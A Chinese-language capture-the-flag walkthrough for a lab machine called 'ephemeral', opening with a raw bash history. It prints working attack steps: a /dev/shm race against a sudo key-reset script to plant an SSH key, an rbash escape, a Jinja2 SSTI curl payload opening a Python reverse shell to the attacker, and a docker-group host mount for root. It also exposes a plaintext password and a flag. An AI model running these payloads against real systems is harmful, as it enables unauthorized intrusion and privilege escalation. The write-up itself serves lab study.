 1582  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1583  clear
 1584  cd /dev/shm/
 1585  ls -al 
 1586  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1587  clear
 1588  cd /dev/shm/
 1589  ls -al 
 1590  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1591  clear
 1592  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1593  while true; do cat /dev/shm/id_rsa.pub
 1594  while true; do cat /dev/shm/id_rsa.pub; done
 1595  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1596  ls 
 1597  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1598  ls -al 
 1599  cat output.txt 
 1600  while true; do cat /dev/shm/id_rsa.pub | tee output.txt; done
 1601  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1602  ls 
 1603  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1604  ls -al 
 1605  cat output.txt 
 1606  while true; do cat /dev/shm/id_rsa.pub | tee output.txt; done
 1607  ls -la 
 1608  while true; do cat /dev/shm/id_rsa.pub | tee /home/donald/output.txt; done
 1609  while true; do cat /dev/shm/id_rsa.pub | grep -i ssh; done
 1610  while true; do cat /dev/shm/id_rsa.pub | grep -v ssh; done
 1611  while true; do cat /dev/shm/id_rsa.pub | grep ssh; done
 1612  while true; do cat /dev/shm/id_rsa.pub | grep -i nossh; done
 1613  ls -la 
 1614  rm -r output.txt 
 1615  while true; do cat /dev/shm/id_rsa.pub | tee /dev/shm/id_rsa.pub > output.txt; done
 1616  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1617  ls 
 1618  while true; do cat /dev/shm/id_rsa.pub > output.txt; done
 1619  ls -al 
 1620  cat output.txt 
 1621  while true; do cat /dev/shm/id_rsa.pub | tee output.txt; done
 1622  ls -la 
 1623  while true; do cat /dev/shm/id_rsa.pub | tee /home/donald/output.txt; done
 1624  while true; do cat /dev/shm/id_rsa.pub | grep -i ssh; done
 1625  while true; do cat /dev/shm/id_rsa.pub | grep -v ssh; done
 1626  while true; do cat /dev/shm/id_rsa.pub | grep ssh; done
 1627  while true; do cat /dev/shm/id_rsa.pub | grep -i nossh; done
 1628  ls -la 
 1629  rm -r output.txt 
 1630  while true; do cat /dev/shm/id_rsa.pub | tee /dev/shm/id_rsa.pub > output.txt; done
 1631  ls -la 
 1632  while true; do tee /dev/shm/id_rsa.pub > output.txt; done
 1633  while true; do tee /dev/shm/id_rsa.pub > /tmp/output.txt; done
 1634  while true; do cat /dev/shm/id_rsa.pub; done
 1635  cd
 1636  exit
 1637  clear
 1638  cd /
 1639  cd /dev/shm/
 1640  ls -la 
 1641  ls -al 
 1642  ls f-la 
 1643  ls -la 
 1644  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" > /dev/shm/id_rsa.pub
 1645  clear
 1646  ls -]al 
 1647  ls -la 
 1648  ls -al 
 1649  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" > /dev/shm/id_rsa.pub
 1650  clear
 1651  ls -la 
 1652  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" > /dev/shm/id_rsa.pub
 1653  ls -la 
 1654  clear
 1655  ls -al 
 1656  rm -r id_rsa.pub 
 1657  ls -al 
 1658  clear
 1659  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" > /dev/shm/id_rsa.pub
 1660  clear
 1661  ls -la 
 1662  clear
 1663  ls -la 
 1664  rm -r id_rsa.pub 
 1665  clear
 1666  ls -la 
 1667  rm -r id_rsa.pub 
 1668  cd
 1669  ls -la 
 1670  cat output.txt 
 1671  ls -la 
 1672  su randy
 1673  exit
 1674  ssh donald@10.0.0.179
 1675  ssh donald@10.0.0.179 -t "bash --noprofile"
 1676  exit
 1677  while true; do tee /dev/shm/id_rsa.pub > /tmp/output.txt; done
 1678  while true; do cat /dev/shm/id_rsa.pub; done
 1679  while true; do cat /dev/shm/id_rsa.pub; grep -v cat; done
 1680  while true; do cat /dev/shm/id_rsa.pub; grep -i ssh; done
 1681  while true; do cat /dev/shm/id_rsa.pub; sleep 9.0 done
 1682  while true; do cat /dev/shm/id_rsa.pub; sleep 9.0; done
 1683  while true; do cat /dev/shm/id_rsa.pub; done
 1684  while true; do cat /dev/shm/id_rsa.pub; done > output.txt
 1685  ls -la 
 1686  cat output.txt 
 1687  clear
 1688  cat output.txt 
 1689  while true; do cat /dev/shm/id_rsa.pub; done > output.txt
 1690  ls -la 
 1691  cat output.txt 
 1692  rm -r 
 1693  rm -r output.txt 
 1694  clear
 1695  cat output.txt 
 1696  ls -la 
 1697  while true; do cat /dev/shm/id_rsa.pub; done > output.txt
 1698  ls -la
 1699  cat output.txt 
 1700  clear
 1701  ls -la 
 1702  clear
 1703  ls -la 
 1704  pwd 
 1705  sudo -l 
 1706  nano mypass.txt
 1707  clear
 1708  ls al 
 1709  ls -la 
 1710  cat mypass.txt 
 1711  clear
 1712  ls -la 
 1713  nano mypass.txt 
 1714  clear
 1715  si kevin
 1716  su kevin
 1717  id 
 1718  su kevin
 1719  exit
 1720  sudo -l
 1721  ssh donald@10.0.0.179 -t "bash --noprofile"
 1722  s -la 
 1723  clear
 1724  ls -la 
 1725  ssh donald@10.0.0.179 -t "bash --noprofile"
 1726  s -la 
 1727  ssh donald@10.0.0.179 -t "bash --noprofile"
 1728  lear
 1729  ssh donald@10.0.0.179 -t "bash --noprofile"
 1730  s -al 
 1731  ssh donald@10.0.0.179 -t "bash --noprofile"
 1732  exit
 1733  clear
 1734  ls -la 
 1735  rm -r .ssh/
 1736  clear
 1737  ls -al 
 1738  touch mypass.txt
 1739  clear
 1740  ls -la 
 1741  clear
 1742  ls -la 
 1743  cd Desktop/
 1744  ls -la 
 1745  clear
 1746  ls -la 
 1747  ./screen -v 
 1748  wget https://www.exploit-db.com/raw/41154 -O exploit.c
 1749  ls -la 
 1750  gcc exploit.c -o exploit
 1751  ls -la 
 1752  clear
 1753  ls -la 
 1754  rm -r exploit.c 
 1755  clear
 1756  ls -la 
 1757  nano exploit.c
 1758  ls -al 
 1759  gcc exploit.c -o exploit
 1760  ls -la 
 1761  rm -r exploit.c 
 1762  clear
 1763  nano exploit.sh
 1764  chmod +x exploit.sh 
 1765  ./exploit.sh 
 1766  ls -la 
 1767  ./exploit.sh 
 1768  clear
 1769  ls -la 
 1770  screen -v 
 1771  ./exploit.sh 
 1772  ls -la 
 1773  which screen
 1774  ls -la 
 1775  ./exploit.sh 
 1776  cd
 1777  ls -la 
 1778  cd Desktop/
 1779  ls -la 
 1780  ./exploit.sh 
 1781  cd /tmp/
 1782  ls -la 
 1783  rm -r rootshell 
 1784  clear
 1785  ls -la 
 1786  cd
 1787  cd Desktop/
 1788  ls -la 
 1789  ./exploit.sh 
 1790  clear
 1791  cd
 1792  su jane
 1793  clear
 1794  ls -la 
 1795  cd Desktop/
 1796  ls -la 
 1797  ./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
 1798  ls -la 
 1799  cat nohup
 1800  clear
 1801  ls -la 
 1802  rm -r nohup
 1803  ls -la 
 1804  rm -r nohup.out 
 1805  clear
 1806  cd /tmp/
 1807  ls -la 
 1808  cd keys/
 1809  ls -la 
 1810  cd..
 1811  cd ..
 1812  ls -la 
 1813  cd keys/
 1814  ls -la 
 1815  cd ..
 1816  ls -la 
 1817  cd keys/
 1818  ls -la 
 1819  cat id_rsa.pub 
 1820  clear
 1821  sudo -l
 1822  cat /usr/local/bin/addKeys.sh
 1823  cd
 1824  ls -la 
 1825  cd /tmp/
 1826  clear
 1827  ls -al 
 1828  sudo -l 
 1829  sudo -u jane /usr/local/bin/addKeys.sh
 1830  cd keys/
 1831  ls -la 
 1832  sudo -u jane /usr/local/bin/addKeys.sh
 1833  ls 
 1834  ls -la 
 1835  sudo -l 
 1836  sudo -u jane /usr/local/bin/addKeys.sh
 1837  clear
 1838  sudo -u jane /usr/local/bin/addKeys.sh
 1839  su jane 
 1840  sudo -l 
 1841  sudo -u jane /usr/local/bin/addKeys.sh
 1842  cd ..
 1843  ls -la 
 1844  cd keys/
 1845  ls -la ~
 1846  sudo -u jane /usr/local/bin/addKeys.sh
 1847  ls -l /home/jane/
 1848  cd
 1849  cd /home/
 1850  cd jane/
 1851  ls -la 
 1852  sudo -u jane /usr/local/bin/addKeys.sh
 1853  ls -al 
 1854  cd .ssh/
 1855  ls -la 
 1856  cat id_rsa
 1857  cat id_rsa.pub 
 1858  clear
 1859  ls -la 
 1860  cd ..
 1861  clear
 1862  sudo -l 
 1863  sudo -u jane /usr/local/bin/addKeys.sh
 1864  clear
 1865  cat /usr/local/bin/addKeys.sh
 1866  cd /dev/s
 1867  cd /dev/shm/
 1868  ls -la 
 1869  cd keys/
 1870  ls -la 
 1871  clear
 1872  sudo -u jane /usr/local/bin/addKeys.sh
 1873  clear
 1874  sudo -l 
 1875  sudo -u jane /usr/local/bin/addKeys.sh
 1876  clear
 1877  ls -al 
 1878  sudo -u jane /usr/local/bin/addKeys.sh
 1879  clear
 1880  ls -la 
 1881  sudo -u jane /usr/local/bin/addKeys.sh
 1882  cd ..
 1883  ls -al 
 1884  ls -la 
 1885  rm -r id_rsa.pub 
 1886  ls -la 
 1887  rm -r id_rsa.pub 
 1888  ls -al 
 1889  ls -la 
 1890  cat id_rsa.pub 
 1891  clear
 1892  ls -al 
 1893  rm -r id_rsa.pub 
 1894  ls -la 
 1895  rm -r id_rsa.pub 
 1896  ls -la 
 1897  clear
 1898  ls -la 
 1899  rm -r id_rsa.pub 
 1900  clear
 1901  ls -al 
 1902  sudo -l 
 1903  sudo -u jane /usr/local/bin/addKeys.sh
 1904  clear
 1905  sudo -u jane /usr/local/bin/addKeys.sh
 1906  clear
 1907  sudo -u jane /usr/local/bin/addKeys.sh
 1908  ls -la 
 1909  clear
 1910  ls -la 
 1911  rm  -r id_rsa.pub 
 1912  clear
 1913  ls -al 
 1914  rm -r id_rsa.pub 
 1915  ls -la 
 1916  clear
 1917  sudo -u jane /usr/local/bin/addKeys.sh
 1918  clear
 1919  ls -al 
 1920  clear
 1921  sudo -l 
 1922  sudo -u jane /usr/local/bin/addKeys.sh
 1923  ls -la 
 1924  rm -r id_rsa.pub 
 1925  clear
 1926  ls 
 1927  ls -al 
 1928  rm -r id_rsa.pub 
 1929  ls -la 
 1930  sudo -u jane /usr/local/bin/addKeys.sh
 1931  clear
 1932  ls -la 
 1933  cd
 1934  clear
 1935  ls -la 
 1936  cat mypass.txt 
 1937  clear
 1938  ls -al 
 1939  cat mypass.txt 
 1940  clear
 1941  sudo -l
 1942  clear
 1943  ls -al 
 1944  rm -r mypass.txt 
 1945  su root
 1946  clear
 1947  su randy
 1948  cd ..
 1949  su randy
 1950  clear
 1951  ls -la 
 1952  cd jane/
 1953  ls -la 
 1954  cd kevin/
 1955  cd randy/
 1956  clear
 1957  ssh jane@10.0.0.179
 1958  exit
 1959  ssh donald@10.0.0.179 -t "bash --noprofile"
 1960  exit 
 1961  clear
 1962  ls -la 
 1963  which pkexec
 1964  cd
 1965  exit
 1966  sudo -l
 1967  clear
 1968  ls -la 
 1969  sudo -l
 1970  clear
 1971  ls -la 
 1972  ssh donald@10.0.0.179 
 1973  exit
 1974  clear
 1975  exit
 1976  clear
 1977  sudo -l 
 1978  su jane
 1979  su kevin
 1980  exit
 1981  ssh donald@10.0.0.179 
 1982  ssh donald@10.0.0.179 -t "bash --profile"
 1983  ssh donald@10.0.0.179 -t "bash --noprofile"
 1984  clear
 1985  exit
 1986  clear
 1987  ls -la 
 1988  cd ..
 1989  ls -al 
 1990  cd donald/
 1991  ls 
 1992  cat mypass.txt 
 1993  cat note.txt 
 1994  clear
 1995  exit
 1996  clea
 1997  rcd
 1998  ssh 10.0.0.179 
 1999  ssh 10.0.0.179 -t "bash --noprofile"
 2000  exit
 2001  whoami
 2002  cd ~
 2003  ls
 2004  cat mypass.txt 
 2005  cat note.txt 
 2006  cd commands/
 2007  ls
 2008  id
 2009  history

```

```plain
(remote) donald@ephemeral:/$ sudo -l
[sudo] password for donald: 
Matching Defaults entries for donald on ephemeral:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User donald may run the following commands on
        ephemeral:
    (jane) PASSWD: /usr/local/bin/addKeys.sh

    
(remote) donald@ephemeral:/$ cat /usr/local/bin/addKeys.sh
#!/bin/bash

/usr/bin/rm -rf /dev/shm/id_rsa.pub
/usr/bin/rm -rf /dev/shm/id_rsa

/usr/bin/ssh-keygen -q -t rsa -N '' -f /dev/shm/id_rsa

/bin/echo "Keys Added!"

/usr/bin/rm -rf /home/jane/.ssh/

/bin/echo "Directory Deleted!"

/usr/bin/mkdir /home/jane/.ssh/

/bin/echo ".ssh Directory Created!"

/usr/bin/cp /dev/shm/id_rsa.pub /home/jane/.ssh/authorized_keys

/bin/echo "Keys Copied."

/usr/bin/chmod 600 /home/jane/.ssh/authorized_keys

/bin/echo "Permissions Changed!"

/usr/bin/rm -rf /dev/shm/id_rsa
/usr/bin/rm -rf /dev/shm/id_rsa.pub 

/bin/echo "Keys Removed!"






(remote) donald@ephemeral:/$ ls -la /usr/local/bin/addKeys.sh
-rwxr-xr-x 1 root root 579 Mar 16  2022 /usr/local/bin/addKeys.sh                                         
(remote) donald@ephemeral:/$ 

```

```plain
#!/bin/bash
# 使用 /bin/bash 解释器执行（不是 rbash）

/usr/bin/rm -rf /dev/shm/id_rsa.pub
# 删除 /dev/shm 中旧的公钥文件
# ⚠️ /dev/shm 是 world-writable，任何用户都能提前放文件

/usr/bin/rm -rf /dev/shm/id_rsa
# 删除 /dev/shm 中旧的私钥文件
# ⚠️ 这里只是假设“文件一定是脚本自己生成的”，但实际上不可信

/usr/bin/ssh-keygen -q -t rsa -N '' -f /dev/shm/id_rsa
# 生成一对 RSA SSH key
#   私钥：/dev/shm/id_rsa
#   公钥：/dev/shm/id_rsa.pub
# -N ''  表示私钥无密码
# -q     静默模式
# ⚠️ 如果文件已存在，ssh-keygen 会询问是否覆盖（交互点 / 竞态点）

/bin/echo "Keys Added!"
# 输出提示信息（无安全意义）

/usr/bin/rm -rf /home/jane/.ssh/
# 删除 jane 原有的 .ssh 目录
# 这会清空她之前的所有 SSH key
# ⚠️ 这是一次“强制重置 SSH 登录方式”

/bin/echo "Directory Deleted!"
# 提示信息

/usr/bin/mkdir /home/jane/.ssh/
# 重新创建 jane 的 .ssh 目录
# 默认权限通常为 755（取决于 umask）

/bin/echo ".ssh Directory Created!"
# 提示信息

/usr/bin/cp /dev/shm/id_rsa.pub /home/jane/.ssh/authorized_keys
# 将 /dev/shm 中的公钥复制为 jane 的 authorized_keys
# 🔥 关键漏洞点：
#   - 完全信任 /dev/shm/id_rsa.pub
#   - 不校验文件来源、owner、inode
#   - 如果攻击者在此之前替换了该文件
#   - jane 就会信任攻击者的 SSH key

/bin/echo "Keys Copied."
# 提示信息

/usr/bin/chmod 600 /home/jane/.ssh/authorized_keys
# 设置 authorized_keys 权限为 600（SSH 要求）
# ⚠️ 权限是对的，但内容可能是攻击者控制的

/bin/echo "Permissions Changed!"
# 提示信息

/usr/bin/rm -rf /dev/shm/id_rsa
# 删除 /dev/shm 中的私钥
# ⚠️ 攻击者通常已提前复制，删除已无意义

/usr/bin/rm -rf /dev/shm/id_rsa.pub
# 删除 /dev/shm 中的公钥
# ⚠️ 只是“表面清理痕迹”

/bin/echo "Keys Removed!"
# 最终提示

```

**这是一个“以 jane 身份重置 SSH 登录密钥”的脚本**  
目的：让执行者可以用新生成的 key 登录 jane

**但因为 使用了 world-writable 的 **`**/dev/shm**`** 且无校验，  
****被 donald 利用做了竞态注入。**

****

**利用 **`**sudo -u jane /usr/local/bin/addKeys.sh**`**  
****往 **`**jane**`** 的 **`**authorized_keys**`** 写入你控制的 SSH 公钥**

---

### ✅ Step 1：生成你自己的 SSH key（一次即可）
在 **donald** 上：

```plain
cd /dev/shm
ssh-keygen -q -t rsa -N '' -f jane
```

确认存在：

```plain
ls -l /dev/shm/jane*
```



尝试时发现存在rbash

```plain
donald@ephemeral:~$ cd /dev/shm -rbash: cd: restricted 
donald@ephemeral:~$ ssh-keygen -q -t rsa -N '' -f jane -rbash: /usr/lib/command-not-found: restricted: cannot specify /' in command names 
donald@ephemeral:~$ ls -l /dev/shm/jane* -rbash: /usr/lib/command-not-found: restricted: cannot specify /' in command names 
donald@ephemeral:~$
```

突破限制

```plain
ssh donald@192.168.0.100 -t "bash --noprofile"
```

donald\nORMAniAntIcINacKLAi

---

### ✅ Step 2：启动竞争（不要停）
```plain
while true; do
  cp /dev/shm/jane /dev/shm/id_rsa
  cp /dev/shm/jane.pub /dev/shm/id_rsa.pub
  chmod 777 /dev/shm/id_rsa /dev/shm/id_rsa.pub
done
```

⚠️ **这个窗口不要关，保持运行**

---

### ✅ Step 3：在另一个终端执行 sudo 脚本
```plain
sudo -u jane /usr/local/bin/addKeys.sh
```

当看到提示：

```plain
/dev/shm/id_rsa already exists.
Overwrite (y/n)?
```

👉 **输入：**

```plain
n
```

然后脚本会正常跑完：

```plain
Keys Added!
Directory Deleted!
.ssh Directory Created!
Keys Copied.
Permissions Changed!
Keys Removed!
```

---

### ✅ Step 4：立刻保存私钥（非常关键）
在 **donald** 上：

```plain
cp /dev/shm/jane ~/jane_id_rsa
chmod 600 ~/jane_id_rsa
```

（就算 `/dev/shm` 里的被删了，这份还能用）

---

### ✅ Step 5：SSH 登录 jane 🎉
##### 本机登录
`ssh -i ~/jane_id_rsa jane@localhost`

```plain
donald@ephemeral:~$ ssh -i ~/jane_id_rsa jane@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:/k63fO51xfAWhhIRatrod8DX2c8EHuVYagl9FGfd6Q0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.17.0-051700rc7-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

17 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
jane@ephemeral:~$ 
```

## 提权-randy
```plain
jane@ephemeral:~$ sudo -l
Matching Defaults entries for jane on ephemeral:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jane may run the following commands on
        ephemeral:
    (randy) NOPASSWD: /usr/bin/python3
        /var/www/html/private_html/app.py

```

```plain
jane@ephemeral:~$ cat /var/www/html/private_html/app.py
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')


    output = Jinja2.from_string('Welcome ' + name + '!').render()


    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

### SSTI外部模板注入：漏洞点
```plain
output = Jinja2.from_string('Welcome ' + name + '!').render()
```

问题有 3 个：

    name 来自用户输入

    被 直接拼接进模板

    使用的是 Jinja2.from_string().render()

```plain
curl -G \
  --data-urlencode "name={{cycler.__init__.__globals__.os.system(\"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\\\"192.168.0.106\\\",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")'\")}}" \
  http://192.168.0.100:5000/page
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# pwncat-cs -lp 4444

(remote) randy@ephemeral:/home/jane$ whoami
randy

(remote) randy@ephemeral:/home/randy$ cat user.txt 
68fef287012c99bf6df47fd97484748f
```

## 提权root
```plain
(remote) randy@ephemeral:/home/randy$ id
uid=1002(randy) gid=1002(randy) groups=1002(randy),1003(docker)
```

可以看见randy是docker组的，又因为之前在ps进程中看到了docker正在运行

```plain
docker run -it -v /:/mnt alpine chroot /mnt /bin/bash
```



### `docker run` 到底做了什么
#### 1️⃣ `docker run`
意思是：

让 **docker 守护进程（root）** 帮你启动一个容器

你虽然是普通用户，但你**指挥的是 root 在干活**。

---

#### 2️⃣ `-v /:/mnt` —— 真正的杀招
```plain
宿主机的 /   →   容器里的 /mnt
```

这一步的真实含义是：

**把宿主机的整个根文件系统，原封不动，交给容器**

此时：

+ `/mnt/etc` = 宿主机 `/etc`
+ `/mnt/root` = 宿主机 `/root`
+ `/mnt/bin` = 宿主机 `/bin`

⚠️ 这一步已经是**完全文件系统接管**了。

---

#### 3️⃣ `alpine`
只是一个**壳子**，不重要  
重要的不是 alpine，而是 **你挂进去的 **`**/**`

---

#### 4️⃣ `chroot /mnt /bin/bash`
这是**最核心的一句**

##### chroot 是什么？
```plain
chroot = 改变“你眼中的根目录”
```

执行这句之后：

| 之前你看到的 `/` | 现在你看到的 `/` |
| --- | --- |
| alpine 容器的 `/` | **宿主机的 **`**/**` |


所以这句：

```plain
chroot /mnt /bin/bash
```

翻成人话就是：

“在宿主机的根目录里，用 bash 给我开一个 shell”





```plain
(remote) randy@ephemeral:/home/randy$ id
uid=1002(randy) gid=1002(randy) groups=1002(randy),1003(docker)
(remote) randy@ephemeral:/home/randy$ docker images
